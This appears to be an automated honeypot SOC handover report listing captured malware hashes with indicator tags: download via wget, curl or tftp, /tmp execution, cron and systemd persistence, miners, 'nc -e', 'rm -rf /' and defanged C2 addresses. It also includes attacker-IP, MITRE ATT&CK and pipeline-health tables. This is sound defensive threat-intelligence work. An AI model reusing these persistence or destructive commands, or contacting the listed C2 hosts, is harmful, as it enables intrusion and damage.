_`5a85f6400740f096bfa7a7bf8ad7439a6c44dee83336701daca96b47c3e1472e` (5a85f6400740f096bfa7a7bf...)_
- `Execution from /tmp` — `/tmp/.syslogd`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `Crypto miner binary` — `xmrig`

_`5b73969e4df42bd57becfd96fdc5ce13873c48995a19a877bf3030e1399fbf2c` (5b73969e4df42bd57becfd96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.XXXXXXXX`
- `chmod +x (make executable)` — `chmod +x`

_`60c3986439f423123eeb6e04e04dac447883863fe79dd8b664283cc4d20ec96d` (60c3986439f423123eeb6e04...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `IP:Port (possible C2)` — `239.255.255[.]250:1900`
- `Botnet keyword` — `botnet`
- `Crypto miner binary` — `xmrig`

_`61aeef0d535d309f4bdda6278a7da4ef9d67674a46b619065b88171ee5c0f581` (61aeef0d535d309f4bdda627...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`62e3e86a7586174df485af5936639769971cfc62fd9d0f2d5385d5bfa61ea88c` (62e3e86a7586174df485af59...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`67e823012241f46e78bf12ced9526ce9719ca21a0a4b3b4f52db62f16e5ec557` (67e823012241f46e78bf12ce...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`6980031c9f60b74691308715d5fa94fe6265c86d6b2c9b9f41004f41c618dbe8` (6980031c9f60b74691308715...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`6d1fe6ab3cd04ca5d1ab790339ee2b6577553bc042af3b7587ece0c195267c9b` (6d1fe6ab3cd04ca5d1ab7903...)_
- `Execution from /tmp` — `/tmp/ktx`
- `chmod +x (make executable)` — `chmod +x`
- `Base64 decode (obfuscation)` — `base64 -d`
- `RC script persistence` — `/etc/rc.`
- `SSH key manipulation` — `.ssh/authorized_keys`
- `System recon (uname)` — `uname -a`
- `IRC PRIVMSG (C2 comms)` — `PRIVMSG`
- `Crypto miner binary` — `minerd`
- `Destructive rm -rf /` — `rm -rf /`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`732e796d24da151af2e4ad54d5706248aefe86686f83e5033c7ca8dd19e97954` (732e796d24da151af2e4ad54...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`73695282607747038a31f516e3f8310a67ae6f2f9e4a0b90b55a40f77272e559` (73695282607747038a31f516...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`773dbd8af231023be6f8d9183e5dcafe78a57550b3050eee11b61d73e82a61d9` (773dbd8af231023be6f8d918...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `Destructive rm -rf /` — `rm -rf /`

_`7766739193c449206ea63751d23551e2057e4de80f6befaeb7a24eaeb63a5ee1` (7766739193c449206ea63751...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`79e51db148418ed38457312972f4d2d61773da0d4cb4697cf40a548567630ff7` (79e51db148418ed384573129...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`7a208815a33bd0cdd8c17129108e55bf1a49e8a57846bc53135759bd045bf9e0` (7a208815a33bd0cdd8c17129...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`7b1cbba56bb80e185cdf2097f5716c31d7e0f88f28ad7220b3b5a2cf73859ec8` (7b1cbba56bb80e185cdf2097...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`7e76874a7c3612f333e1dfb68a9d35c111b5f138df4941f7a6005d6c1ebb83bc` (7e76874a7c3612f333e1dfb6...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`

_`7fd2bd41e693e49cd09260d85864709cc8066f9681b3c2014d9241f128694915` (7fd2bd41e693e49cd09260d8...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `IP:Port (possible C2)` — `94.154.43[.]231:3001`

_`806c1a4193780bbdfdc3db8606747edf12cdc16e8b38e318ed86928c5ce95457` (806c1a4193780bbdfdc3db86...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `Systemd persistence` — `systemctl enable`

_`80ef3c6e9929ca834a0a4b5ce2f833689a69e32f3748083e215e24dbc72831f1` (80ef3c6e9929ca834a0a4b5c...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`81760addaf68ddd3c15a24e180a2991f6fb4ab330a1650e0a363760cd0c36560` (81760addaf68ddd3c15a24e1...)_
- `Download via wget` — `wget`
- `Execution from /tmp` — `/tmp/.sshd`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `91.199.133[.]133:8080`

_`885eedb41d5008249366afbedb69879cb793555ed0594b9bfa7f61f0cecfb0c6` (885eedb41d5008249366afbe...)_
- `Execution from /tmp` — `/tmp/.X11-unix`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`8f96d5a5cd41a687f19e53ba7d9f2dc649227b9d27af957e55c480ea22cb30a3` (8f96d5a5cd41a687f19e53ba...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `168.220.248[.]106:9087`

_`93d5d6729dc0f5a37aef6763ad24ec250df1a7c91600441920ae30fabc9af85c` (93d5d6729dc0f5a37aef6763...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`941efe52eb858311653bf2c1e855555cf735896d500f11ea90aaf7e93d1faa3f` (941efe52eb858311653bf2c1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`945afece38f108d7c1c5c71e785fbf452f7de803ca1f207e6eae1f9dd3d5ae80` (945afece38f108d7c1c5c71e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`98792483aed3a9e0105cdaca1d5208916c07c45e0c46229e221a753fe3db0d30` (98792483aed3a9e0105cdaca...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`9c67e4693e9c4cbcc2daadb3a09722977c4b5f90c31c7a5815d8be4ba371dc3f` (9c67e4693e9c4cbcc2daadb3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/browser`
- `chmod +x (make executable)` — `chmod +x`

_`a48c84f1ce12eecb900ffee1e4c62338986eb771c873e58799fb4b3c3be7e26c` (a48c84f1ce12eecb900ffee1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`a68a4a508a26b77c50c15243812abfc34188cb2c2459fd97d8f0ff80277dbd02` (a68a4a508a26b77c50c15243...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`a9b88512ba552d7c5f283e2e1e070428b0f99db8c4c3b761a51aa2cb0af81015` (a9b88512ba552d7c5f283e2e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`aa92fb3015e189bd59372a0fb43708d6127f936e7a4ede2c424d906023e0cfbe` (aa92fb3015e189bd59372a0f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`b0215599b23e675722bc4fa164ddd1ae79d25fe38d3af14852798183425e8d30` (b0215599b23e675722bc4fa1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`b992e0488abed5c19f215626dee38cc4b7b92b918ab194e276924a462aa97c3f` (b992e0488abed5c19f215626...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`bcfbd1d0c98844ddd4795a6df4e6431a494a0320c72413f188b50140cd30f506` (bcfbd1d0c98844ddd4795a6d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`bd065fb5504cd702dba8d6216d836617021e25be3002dc0bc8db43402ba7af55` (bd065fb5504cd702dba8d621...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`c0523063abe84c4064e3fad4f5503f9a7ea500420ddf909ef4ae1979da45cc15` (c0523063abe84c4064e3fad4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bins.sh`
- `chmod +x (make executable)` — `chmod +x`

_`c749b54ba8d032787dc4c990d63ceca1e43cdf49aed74775931ad3a73558cf0e` (c749b54ba8d032787dc4c990...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` (c8545034cd4fe71eeadb24da...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`c86da460d1d2ff18647ad8d99d08b029e69764f253a635f565d42c3f00555ee4` (c86da460d1d2ff18647ad8d9...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`cb1c3496202d7eb1803dc24fbecc332a245b52878084c1af23c2cca3ea52de09` (cb1c3496202d7eb1803dc24f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`cc87390d87be2b8377ffe32df42d30c56b46c0293ae7a126f466140ad2c2577f` (cc87390d87be2b8377ffe32d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`cd9655a77201f73e69953ec5b53f898de41983c1b4dcedd0c431955b9c20b241` (cd9655a77201f73e69953ec5...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`d58ed4e7cf9ab3181cb59e18050cd9d4c41b334f0f07be08abe5bafed5c04069` (d58ed4e7cf9ab3181cb59e18...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`d59a4194ec66b508697d67d71b69f74f590e8a8bb346507075b3ded56854a374` (d59a4194ec66b508697d67d7...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`d6f225d1c58a1ea7b4ee54afe26607b8f5d93c5ee3092e5ea4271ac7cc606890` (d6f225d1c58a1ea7b4ee54af...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`daeb4dddaefa21f1e952b3a3e606f91d7c95955db3458730d30a0a218d005246` (daeb4dddaefa21f1e952b3a3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`dc1d50597225317d5a9f93841f59c6f03ace0fbe217a23246c2e8be4841e49b8` (dc1d50597225317d5a9f9384...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `168.220.248[.]106:9087`

_`dcac02c71bd67e7ce708e2fad709059b817ebdde9796542ef16855de5c7b9a41` (dcac02c71bd67e7ce708e2fa...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`e0e21cf140a749c8b5a192067c7d57bec0ca935c5cfbd600bc4e8f6dbb2416a9` (e0e21cf140a749c8b5a19206...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`e27e963b2b49cc758ddd65456d335d0183ca9ddc54349494d6a9f49d7c0603f4` (e27e963b2b49cc758ddd6545...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`e479462010c2514b9fa8513bbd3d515fe665d58d6514f7e78411131ff3090ed9` (e479462010c2514b9fa8513b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.sshd`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `91.199.133[.]133:8080`

_`e48278fbe3d856e7c8e337eb92c75044bd2c36edb467a40b19d4830d0fd47357` (e48278fbe3d856e7c8e337eb...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`e60956d9926d18dad03ca3fdf71dfe8e1ac47300c8fe12a4248354c60fbfba66` (e60956d9926d18dad03ca3fd...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Netcat listener/exec` — `nc -e`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`

_`e7ffadca7485550fa00a049f12f3e7e957f7fc19dae3229927af7cc39b13ba46` (e7ffadca7485550fa00a049f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`ec69d3e0d4d9e797c2942cd2aa177b269db94edf5bd104d7a8eb2ecc73029b4c` (ec69d3e0d4d9e797c2942cd2...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`eff4cbad70d1a0cbf9c296ebb2ea16e25cf52cb961b278501081bd6a376f1652` (eff4cbad70d1a0cbf9c296eb...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`fab1754a61b7e16bb69883e2956615c2de9ec8b88fb265532ab71a5c8eedf4c4` (fab1754a61b7e16bb69883e2...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`ff0505f010971ddaa354ff717283644d446b6ae27bd9f8ce2ff4a7ea575d3d18` (ff0505f010971ddaa354ff71...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `68.225.62[.]86` | US | Cox Communications | **100** ⚠️ | 1 |
| `217.208.90[.]253` | SE | Telia Network Services | **100** ⚠️ | 11 |
| `64.62.197[.]197` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 0 |
| `8.243.73[.]199` | CO | CTL Colombia | **100** ⚠️ | 7 |
| `43.142.14[.]199` | CN | Tencent Cloud Computing (Beijing) Co., Ltd | **100** ⚠️ | 2 |
| `216.16.60[.]51` | US | Clarity Telecom LLC | **100** ⚠️ | 3 |
| `31.208.14[.]62` | SE | Bredband2 AB | **100** ⚠️ | 3 |
| `77.239.124[.]130` | NL | ROCKET & MARINICA LTD | **100** ⚠️ | 50 |
| `35.210.218[.]50` | BE | Google LLC | **100** ⚠️ | 4 |
| `66.132.172[.]37` | US | Censys, Inc. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 162 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 155 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 54 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 13 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 11 |

---

## 🔕 False Positive Summary (25 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 12 |
| AbuseIPDB score 1 below threshold 25 | 3 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 220 cases |
| Tool 34  | Credential Extractor        | ✅ 1662 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 23 fingerprints |
| Tool 36  | Command Clustering          | ✅ 62 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 133 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 25 filtered (11.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 66 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 865 files |
| Tool 33  | YARA Classifier             | ✅ 338 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 153 priority case(s) shown individually · 39 recon entry/entries in table (3 group(s) consolidating 6 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-17T05:45:56Z_
